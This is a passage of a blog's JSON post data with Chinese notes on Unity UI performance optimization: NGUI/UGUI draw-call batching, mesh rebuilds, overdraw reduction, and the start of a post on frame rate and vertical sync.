3.优化方案\n控制绘制顺序:PC上资源无限，一般都是从后往前绘制，但在移动上，尽量从前往后绘制.在Unity中，那些Shader中被设置为“Geometry”队列的对象总是从前往后绘制的，而其他固定队列（如“Transparent”“Overla”等）的物体，则都是从后往前绘制的。这意味这，我们可以尽量把物体的队列设置为“Geometry” 。\n尽量减小过度绘制区域:实在需要多层绘制的地方，要尽量减小各部分过度绘制区域，使重合区域小，绘制的像素点也就少一点\n注意性能与效果的取舍:UGUI的许多控件有很好的通用性和展示效果，但是可能会耗更多性能\n过大的不必要绘制尽量代码实现:例如点击屏幕空白区域返回功能，加透明image会增加很多\nUI设计上尽可能简单减少重叠\n\n* 4.针对性优化\n1)文字部分\n主要原因是使用了Outline，Outline实现方式是将Text的四个顶点传过去复制四份，设置四份偏移量实现效果，将偏移量设置很大之后，可以看到一个Text周围有四个相同的Text        \n解决方案:\n1.不使用或者使用Shadow(Shadow通过为图像或者文字的Mesh添加顶点实现阴影效果，Outline继承Shadow，在对象四个角上各添加一个Shadow)\n2.使用Textmesh Pro(Unity5.5)需要制作相应的字体文件，对于动态生成的文字效果不好，固定字体很好\n(https://blog.csdn.net/dark00800/article/details/73011343?utm_source=itdadao&utm_medium=referral)\n3.修改Mesh的UV坐标，提取文字原始UV坐标，扩大文字绘图区域，对文字纹理周围像素点采样，新旧颜色融合\n(http://gad.qq.com/article/detail/29266)\n2)适配IphoneX\n适配的需要加了层背景，不是iPhoneX失活就可以\n\n3)背景人物mesh\n裁剪小一点更好\n\n\n1)Mask组件\nUnity的Mask组件会增加一层Overdraw，还会多增加4个DrawCall\n解决:\n1.使用RectMask2D代替，缺点是只能用于矩形\n2.对于多边形，用MeshMask，红色为UnityMask，蓝色是MeshMask，UnityMask消耗15个DrawCall，Overdraw2次，MeshMask消耗1个DrawCall，1层OverDraw(https://www.cnblogs.com/leoin2012/p/6822859.html)\n\n2)Image的slide属性\n对于slide九宫格图片，可以看情况取消fill center属性，那样中心区域会不渲染，中心区域也就镂空，重合面积也会小\n\n1)重合多的地方尽可能不重合\n\n2)无用的Image\n少量的panel或者单纯的空父物体身上加着image，虽然没有给图片，但是还是会渲染\n\n3)移动的波浪图片过大过多(修改高度，宽度)\n4)特效粒子效果优化(http://www.u3dnotes.com/archives/807)\n粒子效果薄弱的可以使用序列帧动画实现\n\n1)三层大底图，一个纯黑底，还有两层楼梯背景(可以纯黑底图合并到两层)\n2)楼梯前底图可以小一点不和最底下图标重叠\n\n部分小细节：\n1.slide九宫格图片，取消fill center，中心镂空\n2.mask尽量不用，可以用rect mask2D 代替\n3.不用UI/Effect，包括Shadow，Outline，Position As UV1\n4.不用Image的Tiled类型\n5.不用Pixel Perfect\n6.动静分离，动态的在父物体上加个Canvas\n7.尽量active，不要destroy，也不要设置Alpha=0这样还是会渲染\n8.不用BestFit(代价高，Unity会为该元素用到的所有字号生成图元保存在Altlas中，增加额外生成时间，还会使得字体对应的atlas变大)\n9.特效粒子\n\n⑴尽量减少alpha = 0的资源的使用，因为这种资源也会参与绘制，占用一定的GPU。 ⑵制作图集的时候，尽量使小图排布紧凑，尽量图集中大面积留白，理由同上。 ⑶避免无用对象及组件的过度使用\n如果sprite是中心镂空且切图为九宫格时，可以去除fill center，以减少over draw游戏中许多时候会使用一个透明的Image组件来监听点击事件或者屏蔽Image后面的按钮事件，空的Image可以解决这个问题，用起来也很方便，但是空的Image照旧会参与绘制，从而产生overdraw。解决办法是扩展Graphic组件来替换Image组件。 如果是只要点击区域，不要显示内容的。","slug":"Unity/Optimize/Unity_UI优化","published":1,"updated":"2020-07-17T02:29:17.641Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckfvz8d09003i2gk77t3if7zm","content":"<hr>\n<h1 id=\"UI优化\"><a href=\"#UI优化\" class=\"headerlink\" title=\"UI优化\"></a>UI优化</h1><ul>\n<li>1,降低界面的渲染开销.2,降低界面的更新开销(网格合并).3,高效处理大量 HUD 元素.</li>\n<li>NGUI 与 UGUI 的不同点在于:元素更新方式(字/图片更新时的不同), DrawCall合并规则,网格更新机制</li>\n<li>直播视频 <a href=\"https://blog.uwa4d.com/archives/video_UI.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/video_UI.html</a></li>\n<li><a href=\"https://blog.uwa4d.com/archives/USparkle_NGUI.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/USparkle_NGUI.html</a></li>\n</ul>\n<h1 id=\"NGUI优化\"><a href=\"#NGUI优化\" class=\"headerlink\" title=\"NGUI优化\"></a>NGUI优化</h1><p><img src=\"/2020/05/08/Unity/Optimize/Unity_UI%E4%BC%98%E5%8C%96/NGUIFile.png\" alt=\"NGUI代码文件\"><br><img src=\"/2020/05/08/Unity/Optimize/Unity_UI%E4%BC%98%E5%8C%96/NGUIInternal.png\" alt=\"NGUI内核\"></p>\n<ul>\n<li>参考文档:<br><a href=\"https://blog.uwa4d.com/archives/USparkle_NGUI.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/USparkle_NGUI.html</a>,<br><a href=\"https://zhuanlan.zhihu.com/p/102544809\" target=\"_blank\" rel=\"noopener\">https://zhuanlan.zhihu.com/p/102544809</a></li>\n<li>元素更新方式:一个 UI 展示在界面上面,是将图片以及文字转换成为顶点,UV,颜色,法线,切线,三角形顶点索引等合成 Mesh,然后在 GPU 上面呈现响应的人体识别的像素.</li>\n<li>使用 BetterList进行优化</li>\n<li>对于 NGUI 使用大量的 SetActive(false),适量的:Color.a=0,移除,Timer+二级缓存</li>\n<li>渲染顺序:Draw Call合并规则,以 UIPanel 为单位,将 UIPanel 下面的元素 以 Depth 大小为排序规则,如果是相同的图集,就合并成一个 Draw Call,进行合并.<br>检测 Draw Call –&gt;在每个 UIPanel 上面可以调用出 DrawCall Tool           </li>\n<li>网格更新 UIPanel.LateUpdate 两种更新方式:UIPanel.FillDrawCall 更新单个 DrawCall ,<br>UIPanel.FillAllDrawCalls 更新所有 DrawCall,如果这种情况经常发生,CPU会有峰值.</li>\n<li>一个 DrawCall 对应一个 Mesh,网格重建时是根据不同的 Mesh,例如字体与图片的 mesh 就不同,就会分开重建</li>\n<li>先拆分 UIPanel,控制 FillAllDrawCalls</li>\n<li>降低界面的渲染开销:<blockquote>\n<ul>\n<li>profiling 查看开销</li>\n<li>DrawCall 多少</li>\n<li>Mesh.xxxVBO 网格更新创建,网格经常变动,就会不停的刷新 VBO,然后提交到 GPU 进行渲染</li>\n<li>GPU 的 过度绘制 Overdraw</li>\n<li>NGUI 产生的 Mesh 都是通过 MeshRenderer 画出来的</li>\n<li>NGUI 中的 UITexture,单独占用一个 DrawCall; Depth 穿插 同一个图集或者字体,设置相近的 Depth;设置了 Scale=0</li>\n<li>动静分离,拆分 UIPanel</li>\n<li>降低更新频率,降低小地图的更新频率,一段时间内,小地图内的元素不更新不移动等.</li>\n<li>避免”敏感操作”.因为元素隐藏和显示,触发了FillAllDrawCalls,添加/删除元素时,穿插了其他的 UIDrawCall 或者自成一个UIDrawCall.<br>尝试让插入的元素能够合入现有的 UIDrawCall,通过 Scale =0或者 alpha 接近 0 来隐藏.</li>\n<li>优化选项: Static 选项,如果当前这个界面是静态界面,不会发生位移,就可以打开<br>Visible,如果打开,就不需要重新计算控件的包围盒,用在大量计算 mesh 重建上面.例子:在界面上面完全展示出来的,就不需要计算,可以勾选</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<ul>\n<li>高效处理大量 HUD (血条),图片尽量使用 Simple/Filled 模式,顶点数,面数尽量降低,尽可能使用相同图集.最好分帧加载 HUD.<br>对于伤害数字(飘字),可以转成图片字,不要修改父节点,使用对象重用池,隔帧更新,控制总量.使用 world space 替换 worldtoscreenpoint 主角单独一个 Canvas/UIPanel,这样当主角行动时,不会触发其他重建.将血条替换为 Shadow</li>\n</ul>\n</blockquote>\n<hr>\n<h1 id=\"UGUI-优化\"><a href=\"#UGUI-优化\" class=\"headerlink\" title=\"UGUI 优化\"></a>UGUI 优化</h1><ul>\n<li>元素更新方式:使用 Scale=0,Alpha Group =0 </li>\n<li>渲染顺序:Draw Call合并规则, 需要仔细测试,图片和图片在同一级,字体和字体在同一级,如果中间缺一级,可以添加一个中间级别来分割从而减低 draw call 等等操作.<br>检测 Draw Call –&gt;使用 Frame Debugger<br>在 UGUI 上面对 Draw Call 做优化,1:检测重叠是由控件的包围盒子去检测是否重叠的,需要注意.2:不规则摆放的图片,需要在一个图集里面.3:动态遮挡.4:3D UI 等,都是有非常高的 Draw Call</li>\n<li>网格更新 Canvas.BuildBatch 更新所有的 DrawCall  ,仅限于当前的这个Canvas<br>WaitingForJob<br>PutGeometryJobFence<br>BatchRenderer.Flush </li>\n<li>一个 DrawCall 对应一个 Mesh,网格重建时是根据不同的 Canvas,例如字体与图片的 Canvas 相同,就会一起进行重建</li>\n<li>拆分 Canvas</li>\n<li>降低界面的渲染开销:   <blockquote>\n<ul>\n<li>profiling 查看开销</li>\n<li>DrawCall 多少</li>\n<li>Mesh.xxxVBO 网格更新创建,网格经常变动,就会不停的刷新 VBO,然后提交到 GPU 进行渲染</li>\n<li>GPU 的 过度绘制 Overdraw</li>\n<li>UGUI 的 Z 值不为 0,与其他的 UI 不同,会被单独合批成为一个 Draw Call,把 UI 移动到屏幕外,不会降低 Draw Call     </li>\n<li>UGUI 的 DrawCall 上升的主要原因是 Hierarchy 中的 穿插与重叠,例如:scrollveiw 与图标,红点等等</li>\n<li>UGUI Sprite Packer图集,一组纹理具有相同的 tag, 但是打在了不同的图集里面了,是因为 alpha 通道不同,压缩方式不同.会让人以为本来是一个图集,结果会在不同的图集里面</li>\n<li>动静分离</li>\n<li>降低更新频率</li>\n<li>避免”敏感操作”,不要对 UI 进行相同的 position 赋值,除非position进行肉眼可见的改变,每次赋值底层可能都在进行Mesh重建,如果有就会重建.</li>\n<li>优化选项</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<ul>\n<li>高效处理大量 HUD (血条),图片尽量使用 Simple/Filled 模式,顶点数,面数尽量降低,尽可能使用相同图集.最好分帧加载 HUD.<br>对于伤害数字(飘字),可以转成图片字,不要修改父节点,使用对象重用池,隔帧更新,控制总量. 使用 world space 替换 worldtoscreenpoint 主角单独一个 Canvas/UIPanel,这样当主角行动时,不会触发其他重建,使用 textMesh/textpro 第三方库.将血条替换为 Shadow</li>\n<li>子线程合批 mesh</li>\n<li>检查重叠关系,使用线框模式检查</li>\n<li>文字图片分层,最好将所有的文字分在一层(拓扑排序中),放在渲染最顶层</li>\n<li>只接受逻辑,不进行绘制</li>\n<li>将多边形镂空的脚本,只有可显示区域进行绘制 <a href=\"https://blog.uwa4d.com/archives/fillrate.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/fillrate.html</a></li>\n<li>减少事件拦截,不需要事件响应的,不需要勾选 Raycast Target</li>\n<li>动静分离时:自动给动态的组件添加上 cavans </li>\n<li>如果有动画一直修改 Image 上面的 color 属性,就是修改顶点属性上面的修改会导致重建网格(mesh),需要写个脚本创建一个 material 在 lateUpdate 里面修改创建的material的颜色达到动画的目的</li>\n</ul>\n</blockquote>\n<h1 id=\"Overdraw优化-降低填充率\"><a href=\"#Overdraw优化-降低填充率\" class=\"headerlink\" title=\"Overdraw优化,降低填充率\"></a>Overdraw优化,降低填充率</h1><p>GPU Overdraw局部像素区域压力过大,单像素填充压力过大.</p>\n<ul>\n<li><p>1:在某个背景上有个按钮，要将按钮绘制在背景上，这个就是Overdraw，Overdraw无法避免，只能优化降低</p>\n</li>\n<li><p>2.性能参数<br>总填充数值峰:单帧总填充像素数量最大值<br>填充倍数峰值:单帧最大填充倍数(10.0X就是该帧刷新10遍)<br>单帧填充倍数:该帧总填充数/该帧渲染相机分辨率        </p>\n</li>\n<li><p>3.优化方案<br>控制绘制顺序:PC上资源无限，一般都是从后往前绘制，但在移动上，尽量从前往后绘制.在Unity中，那些Shader中被设置为“Geometry”队列的对象总是从前往后绘制的，而其他固定队列（如“Transparent”“Overla”等）的物体，则都是从后往前绘制的。这意味这，我们可以尽量把物体的队列设置为“Geometry” 。<br>尽量减小过度绘制区域:实在需要多层绘制的地方，要尽量减小各部分过度绘制区域，使重合区域小，绘制的像素点也就少一点<br>注意性能与效果的取舍:UGUI的许多控件有很好的通用性和展示效果，但是可能会耗更多性能<br>过大的不必要绘制尽量代码实现:例如点击屏幕空白区域返回功能，加透明image会增加很多<br>UI设计上尽可能简单减少重叠</p>\n</li>\n<li><p>4.针对性优化<br>1)文字部分<br>主要原因是使用了Outline，Outline实现方式是将Text的四个顶点传过去复制四份，设置四份偏移量实现效果，将偏移量设置很大之后，可以看到一个Text周围有四个相同的Text<br>解决方案:</p>\n</li>\n</ul>\n<p>1.不使用或者使用Shadow(Shadow通过为图像或者文字的Mesh添加顶点实现阴影效果，Outline继承Shadow，在对象四个角上各添加一个Shadow)<br>2.使用Textmesh Pro(Unity5.5)需要制作相应的字体文件，对于动态生成的文字效果不好，固定字体很好<br>(<a href=\"https://blog.csdn.net/dark00800/article/details/73011343?utm_source=itdadao&amp;utm_medium=referral\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/dark00800/article/details/73011343?utm_source=itdadao&amp;utm_medium=referral</a>)<br>3.修改Mesh的UV坐标，提取文字原始UV坐标，扩大文字绘图区域，对文字纹理周围像素点采样，新旧颜色融合<br>(<a href=\"http://gad.qq.com/article/detail/29266\" target=\"_blank\" rel=\"noopener\">http://gad.qq.com/article/detail/29266</a>)<br>2)适配IphoneX<br>适配的需要加了层背景，不是iPhoneX失活就可以</p>\n<p>3)背景人物mesh<br>裁剪小一点更好</p>\n<p>1)Mask组件<br>Unity的Mask组件会增加一层Overdraw，还会多增加4个DrawCall<br>解决:<br>1.使用RectMask2D代替，缺点是只能用于矩形<br>2.对于多边形，用MeshMask，红色为UnityMask，蓝色是MeshMask，UnityMask消耗15个DrawCall，Overdraw2次，MeshMask消耗1个DrawCall，1层OverDraw(<a href=\"https://www.cnblogs.com/leoin2012/p/6822859.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/leoin2012/p/6822859.html</a>)</p>\n<p>2)Image的slide属性<br>对于slide九宫格图片，可以看情况取消fill center属性，那样中心区域会不渲染，中心区域也就镂空，重合面积也会小</p>\n<p>1)重合多的地方尽可能不重合</p>\n<p>2)无用的Image<br>少量的panel或者单纯的空父物体身上加着image，虽然没有给图片，但是还是会渲染</p>\n<p>3)移动的波浪图片过大过多(修改高度，宽度)<br>4)特效粒子效果优化(<a href=\"http://www.u3dnotes.com/archives/807\" target=\"_blank\" rel=\"noopener\">http://www.u3dnotes.com/archives/807</a>)<br>粒子效果薄弱的可以使用序列帧动画实现</p>\n<p>1)三层大底图，一个纯黑底，还有两层楼梯背景(可以纯黑底图合并到两层)<br>2)楼梯前底图可以小一点不和最底下图标重叠</p>\n<p>部分小细节：<br>1.slide九宫格图片，取消fill center，中心镂空<br>2.mask尽量不用，可以用rect mask2D 代替<br>3.不用UI/Effect，包括Shadow，Outline，Position As UV1<br>4.不用Image的Tiled类型<br>5.不用Pixel Perfect<br>6.动静分离，动态的在父物体上加个Canvas<br>7.尽量active，不要destroy，也不要设置Alpha=0这样还是会渲染<br>8.不用BestFit(代价高，Unity会为该元素用到的所有字号生成图元保存在Altlas中，增加额外生成时间，还会使得字体对应的atlas变大)<br>9.特效粒子</p>\n<p>⑴尽量减少alpha = 0的资源的使用，因为这种资源也会参与绘制，占用一定的GPU。 ⑵制作图集的时候，尽量使小图排布紧凑，尽量图集中大面积留白，理由同上。 ⑶避免无用对象及组件的过度使用<br>如果sprite是中心镂空且切图为九宫格时，可以去除fill center，以减少over draw游戏中许多时候会使用一个透明的Image组件来监听点击事件或者屏蔽Image后面的按钮事件，空的Image可以解决这个问题，用起来也很方便，但是空的Image照旧会参与绘制，从而产生overdraw。解决办法是扩展Graphic组件来替换Image组件。 如果是只要点击区域，不要显示内容的。</p>\n","site":{"data":{}},"excerpt":"","more":"<hr>\n<h1 id=\"UI优化\"><a href=\"#UI优化\" class=\"headerlink\" title=\"UI优化\"></a>UI优化</h1><ul>\n<li>1,降低界面的渲染开销.2,降低界面的更新开销(网格合并).3,高效处理大量 HUD 元素.</li>\n<li>NGUI 与 UGUI 的不同点在于:元素更新方式(字/图片更新时的不同), DrawCall合并规则,网格更新机制</li>\n<li>直播视频 <a href=\"https://blog.uwa4d.com/archives/video_UI.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/video_UI.html</a></li>\n<li><a href=\"https://blog.uwa4d.com/archives/USparkle_NGUI.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/USparkle_NGUI.html</a></li>\n</ul>\n<h1 id=\"NGUI优化\"><a href=\"#NGUI优化\" class=\"headerlink\" title=\"NGUI优化\"></a>NGUI优化</h1><p><img src=\"/2020/05/08/Unity/Optimize/Unity_UI%E4%BC%98%E5%8C%96/NGUIFile.png\" alt=\"NGUI代码文件\"><br><img src=\"/2020/05/08/Unity/Optimize/Unity_UI%E4%BC%98%E5%8C%96/NGUIInternal.png\" alt=\"NGUI内核\"></p>\n<ul>\n<li>参考文档:<br><a href=\"https://blog.uwa4d.com/archives/USparkle_NGUI.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/USparkle_NGUI.html</a>,<br><a href=\"https://zhuanlan.zhihu.com/p/102544809\" target=\"_blank\" rel=\"noopener\">https://zhuanlan.zhihu.com/p/102544809</a></li>\n<li>元素更新方式:一个 UI 展示在界面上面,是将图片以及文字转换成为顶点,UV,颜色,法线,切线,三角形顶点索引等合成 Mesh,然后在 GPU 上面呈现响应的人体识别的像素.</li>\n<li>使用 BetterList进行优化</li>\n<li>对于 NGUI 使用大量的 SetActive(false),适量的:Color.a=0,移除,Timer+二级缓存</li>\n<li>渲染顺序:Draw Call合并规则,以 UIPanel 为单位,将 UIPanel 下面的元素 以 Depth 大小为排序规则,如果是相同的图集,就合并成一个 Draw Call,进行合并.<br>检测 Draw Call –&gt;在每个 UIPanel 上面可以调用出 DrawCall Tool           </li>\n<li>网格更新 UIPanel.LateUpdate 两种更新方式:UIPanel.FillDrawCall 更新单个 DrawCall ,<br>UIPanel.FillAllDrawCalls 更新所有 DrawCall,如果这种情况经常发生,CPU会有峰值.</li>\n<li>一个 DrawCall 对应一个 Mesh,网格重建时是根据不同的 Mesh,例如字体与图片的 mesh 就不同,就会分开重建</li>\n<li>先拆分 UIPanel,控制 FillAllDrawCalls</li>\n<li>降低界面的渲染开销:<blockquote>\n<ul>\n<li>profiling 查看开销</li>\n<li>DrawCall 多少</li>\n<li>Mesh.xxxVBO 网格更新创建,网格经常变动,就会不停的刷新 VBO,然后提交到 GPU 进行渲染</li>\n<li>GPU 的 过度绘制 Overdraw</li>\n<li>NGUI 产生的 Mesh 都是通过 MeshRenderer 画出来的</li>\n<li>NGUI 中的 UITexture,单独占用一个 DrawCall; Depth 穿插 同一个图集或者字体,设置相近的 Depth;设置了 Scale=0</li>\n<li>动静分离,拆分 UIPanel</li>\n<li>降低更新频率,降低小地图的更新频率,一段时间内,小地图内的元素不更新不移动等.</li>\n<li>避免”敏感操作”.因为元素隐藏和显示,触发了FillAllDrawCalls,添加/删除元素时,穿插了其他的 UIDrawCall 或者自成一个UIDrawCall.<br>尝试让插入的元素能够合入现有的 UIDrawCall,通过 Scale =0或者 alpha 接近 0 来隐藏.</li>\n<li>优化选项: Static 选项,如果当前这个界面是静态界面,不会发生位移,就可以打开<br>Visible,如果打开,就不需要重新计算控件的包围盒,用在大量计算 mesh 重建上面.例子:在界面上面完全展示出来的,就不需要计算,可以勾选</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<ul>\n<li>高效处理大量 HUD (血条),图片尽量使用 Simple/Filled 模式,顶点数,面数尽量降低,尽可能使用相同图集.最好分帧加载 HUD.<br>对于伤害数字(飘字),可以转成图片字,不要修改父节点,使用对象重用池,隔帧更新,控制总量.使用 world space 替换 worldtoscreenpoint 主角单独一个 Canvas/UIPanel,这样当主角行动时,不会触发其他重建.将血条替换为 Shadow</li>\n</ul>\n</blockquote>\n<hr>\n<h1 id=\"UGUI-优化\"><a href=\"#UGUI-优化\" class=\"headerlink\" title=\"UGUI 优化\"></a>UGUI 优化</h1><ul>\n<li>元素更新方式:使用 Scale=0,Alpha Group =0 </li>\n<li>渲染顺序:Draw Call合并规则, 需要仔细测试,图片和图片在同一级,字体和字体在同一级,如果中间缺一级,可以添加一个中间级别来分割从而减低 draw call 等等操作.<br>检测 Draw Call –&gt;使用 Frame Debugger<br>在 UGUI 上面对 Draw Call 做优化,1:检测重叠是由控件的包围盒子去检测是否重叠的,需要注意.2:不规则摆放的图片,需要在一个图集里面.3:动态遮挡.4:3D UI 等,都是有非常高的 Draw Call</li>\n<li>网格更新 Canvas.BuildBatch 更新所有的 DrawCall  ,仅限于当前的这个Canvas<br>WaitingForJob<br>PutGeometryJobFence<br>BatchRenderer.Flush </li>\n<li>一个 DrawCall 对应一个 Mesh,网格重建时是根据不同的 Canvas,例如字体与图片的 Canvas 相同,就会一起进行重建</li>\n<li>拆分 Canvas</li>\n<li>降低界面的渲染开销:   <blockquote>\n<ul>\n<li>profiling 查看开销</li>\n<li>DrawCall 多少</li>\n<li>Mesh.xxxVBO 网格更新创建,网格经常变动,就会不停的刷新 VBO,然后提交到 GPU 进行渲染</li>\n<li>GPU 的 过度绘制 Overdraw</li>\n<li>UGUI 的 Z 值不为 0,与其他的 UI 不同,会被单独合批成为一个 Draw Call,把 UI 移动到屏幕外,不会降低 Draw Call     </li>\n<li>UGUI 的 DrawCall 上升的主要原因是 Hierarchy 中的 穿插与重叠,例如:scrollveiw 与图标,红点等等</li>\n<li>UGUI Sprite Packer图集,一组纹理具有相同的 tag, 但是打在了不同的图集里面了,是因为 alpha 通道不同,压缩方式不同.会让人以为本来是一个图集,结果会在不同的图集里面</li>\n<li>动静分离</li>\n<li>降低更新频率</li>\n<li>避免”敏感操作”,不要对 UI 进行相同的 position 赋值,除非position进行肉眼可见的改变,每次赋值底层可能都在进行Mesh重建,如果有就会重建.</li>\n<li>优化选项</li>\n</ul>\n</blockquote>\n</li>\n</ul>\n<blockquote>\n<ul>\n<li>高效处理大量 HUD (血条),图片尽量使用 Simple/Filled 模式,顶点数,面数尽量降低,尽可能使用相同图集.最好分帧加载 HUD.<br>对于伤害数字(飘字),可以转成图片字,不要修改父节点,使用对象重用池,隔帧更新,控制总量. 使用 world space 替换 worldtoscreenpoint 主角单独一个 Canvas/UIPanel,这样当主角行动时,不会触发其他重建,使用 textMesh/textpro 第三方库.将血条替换为 Shadow</li>\n<li>子线程合批 mesh</li>\n<li>检查重叠关系,使用线框模式检查</li>\n<li>文字图片分层,最好将所有的文字分在一层(拓扑排序中),放在渲染最顶层</li>\n<li>只接受逻辑,不进行绘制</li>\n<li>将多边形镂空的脚本,只有可显示区域进行绘制 <a href=\"https://blog.uwa4d.com/archives/fillrate.html\" target=\"_blank\" rel=\"noopener\">https://blog.uwa4d.com/archives/fillrate.html</a></li>\n<li>减少事件拦截,不需要事件响应的,不需要勾选 Raycast Target</li>\n<li>动静分离时:自动给动态的组件添加上 cavans </li>\n<li>如果有动画一直修改 Image 上面的 color 属性,就是修改顶点属性上面的修改会导致重建网格(mesh),需要写个脚本创建一个 material 在 lateUpdate 里面修改创建的material的颜色达到动画的目的</li>\n</ul>\n</blockquote>\n<h1 id=\"Overdraw优化-降低填充率\"><a href=\"#Overdraw优化-降低填充率\" class=\"headerlink\" title=\"Overdraw优化,降低填充率\"></a>Overdraw优化,降低填充率</h1><p>GPU Overdraw局部像素区域压力过大,单像素填充压力过大.</p>\n<ul>\n<li><p>1:在某个背景上有个按钮，要将按钮绘制在背景上，这个就是Overdraw，Overdraw无法避免，只能优化降低</p>\n</li>\n<li><p>2.性能参数<br>总填充数值峰:单帧总填充像素数量最大值<br>填充倍数峰值:单帧最大填充倍数(10.0X就是该帧刷新10遍)<br>单帧填充倍数:该帧总填充数/该帧渲染相机分辨率        </p>\n</li>\n<li><p>3.优化方案<br>控制绘制顺序:PC上资源无限，一般都是从后往前绘制，但在移动上，尽量从前往后绘制.在Unity中，那些Shader中被设置为“Geometry”队列的对象总是从前往后绘制的，而其他固定队列（如“Transparent”“Overla”等）的物体，则都是从后往前绘制的。这意味这，我们可以尽量把物体的队列设置为“Geometry” 。<br>尽量减小过度绘制区域:实在需要多层绘制的地方，要尽量减小各部分过度绘制区域，使重合区域小，绘制的像素点也就少一点<br>注意性能与效果的取舍:UGUI的许多控件有很好的通用性和展示效果，但是可能会耗更多性能<br>过大的不必要绘制尽量代码实现:例如点击屏幕空白区域返回功能，加透明image会增加很多<br>UI设计上尽可能简单减少重叠</p>\n</li>\n<li><p>4.针对性优化<br>1)文字部分<br>主要原因是使用了Outline，Outline实现方式是将Text的四个顶点传过去复制四份，设置四份偏移量实现效果，将偏移量设置很大之后，可以看到一个Text周围有四个相同的Text<br>解决方案:</p>\n</li>\n</ul>\n<p>1.不使用或者使用Shadow(Shadow通过为图像或者文字的Mesh添加顶点实现阴影效果，Outline继承Shadow，在对象四个角上各添加一个Shadow)<br>2.使用Textmesh Pro(Unity5.5)需要制作相应的字体文件，对于动态生成的文字效果不好，固定字体很好<br>(<a href=\"https://blog.csdn.net/dark00800/article/details/73011343?utm_source=itdadao&amp;utm_medium=referral\" target=\"_blank\" rel=\"noopener\">https://blog.csdn.net/dark00800/article/details/73011343?utm_source=itdadao&amp;utm_medium=referral</a>)<br>3.修改Mesh的UV坐标，提取文字原始UV坐标，扩大文字绘图区域，对文字纹理周围像素点采样，新旧颜色融合<br>(<a href=\"http://gad.qq.com/article/detail/29266\" target=\"_blank\" rel=\"noopener\">http://gad.qq.com/article/detail/29266</a>)<br>2)适配IphoneX<br>适配的需要加了层背景，不是iPhoneX失活就可以</p>\n<p>3)背景人物mesh<br>裁剪小一点更好</p>\n<p>1)Mask组件<br>Unity的Mask组件会增加一层Overdraw，还会多增加4个DrawCall<br>解决:<br>1.使用RectMask2D代替，缺点是只能用于矩形<br>2.对于多边形，用MeshMask，红色为UnityMask，蓝色是MeshMask，UnityMask消耗15个DrawCall，Overdraw2次，MeshMask消耗1个DrawCall，1层OverDraw(<a href=\"https://www.cnblogs.com/leoin2012/p/6822859.html\" target=\"_blank\" rel=\"noopener\">https://www.cnblogs.com/leoin2012/p/6822859.html</a>)</p>\n<p>2)Image的slide属性<br>对于slide九宫格图片，可以看情况取消fill center属性，那样中心区域会不渲染，中心区域也就镂空，重合面积也会小</p>\n<p>1)重合多的地方尽可能不重合</p>\n<p>2)无用的Image<br>少量的panel或者单纯的空父物体身上加着image，虽然没有给图片，但是还是会渲染</p>\n<p>3)移动的波浪图片过大过多(修改高度，宽度)<br>4)特效粒子效果优化(<a href=\"http://www.u3dnotes.com/archives/807\" target=\"_blank\" rel=\"noopener\">http://www.u3dnotes.com/archives/807</a>)<br>粒子效果薄弱的可以使用序列帧动画实现</p>\n<p>1)三层大底图，一个纯黑底，还有两层楼梯背景(可以纯黑底图合并到两层)<br>2)楼梯前底图可以小一点不和最底下图标重叠</p>\n<p>部分小细节：<br>1.slide九宫格图片，取消fill center，中心镂空<br>2.mask尽量不用，可以用rect mask2D 代替<br>3.不用UI/Effect，包括Shadow，Outline，Position As UV1<br>4.不用Image的Tiled类型<br>5.不用Pixel Perfect<br>6.动静分离，动态的在父物体上加个Canvas<br>7.尽量active，不要destroy，也不要设置Alpha=0这样还是会渲染<br>8.不用BestFit(代价高，Unity会为该元素用到的所有字号生成图元保存在Altlas中，增加额外生成时间，还会使得字体对应的atlas变大)<br>9.特效粒子</p>\n<p>⑴尽量减少alpha = 0的资源的使用，因为这种资源也会参与绘制，占用一定的GPU。 ⑵制作图集的时候，尽量使小图排布紧凑，尽量图集中大面积留白，理由同上。 ⑶避免无用对象及组件的过度使用<br>如果sprite是中心镂空且切图为九宫格时，可以去除fill center，以减少over draw游戏中许多时候会使用一个透明的Image组件来监听点击事件或者屏蔽Image后面的按钮事件，空的Image可以解决这个问题，用起来也很方便，但是空的Image照旧会参与绘制，从而产生overdraw。解决办法是扩展Graphic组件来替换Image组件。 如果是只要点击区域，不要显示内容的。</p>\n"},{"title":"Unity 优化总纲","date":"2020-05-08T03:41:32.000Z","top":20,"_content":"\n# 帧率\n* 1:FPS 的概念:FPS 是一段时间内的平均值。\n平均 FPS = 帧数 / 一段时长。   通常意义上是讲的 60 帧/S\n帧数可以用每次进入 Update 时加一的变量来统计。一段时长就是进入 Update 时 Time.deltaTime 的累加因为是平均值，所以当时间越长时，这个值才是稳定的。\n帧率 16ms 表示渲染完这一帧花费了 16ms\n\n\n* 2 显示器和显卡的概念: 显示器和显卡是 2 个概念,显卡写入帧缓冲区的速度不等于显示器显示画面(扫描枪扫描一次)的速度,大部分显示器是 60HZ,也就是每秒钟显示 60 幅画面.\n\n* 3 问题:显卡写入缓冲区的速度(画图的速度)超过了显示器每秒钟显示画面的速度!!帧率概念:显卡的 FPS/帧率是显卡画图的速度,假设显卡每秒可以画 90 幅画面,显示器每秒只能展示 60 幅画面,也就是当显示器正在显示第 A 帧的画面,显卡将A帧这个缓冲区覆盖成一半的 A 帧 + B 帧的数据,就造成了显示器显示画面的撕裂.垂直同步就是为了解决这个问题存在的.\n\n* 4 垂直同步,显卡的画图速度会被限制成显示器显示画面的速度,显卡写入缓冲区的操作会等待显示器的信号,等显示器将每一幅画面都显示完整了,才会显示下一副画面.       \n当显卡写入缓冲区的速度/帧率与垂直同步的速度一致,则不会造成画面撕裂,否则就会产生画面撕裂的感觉.      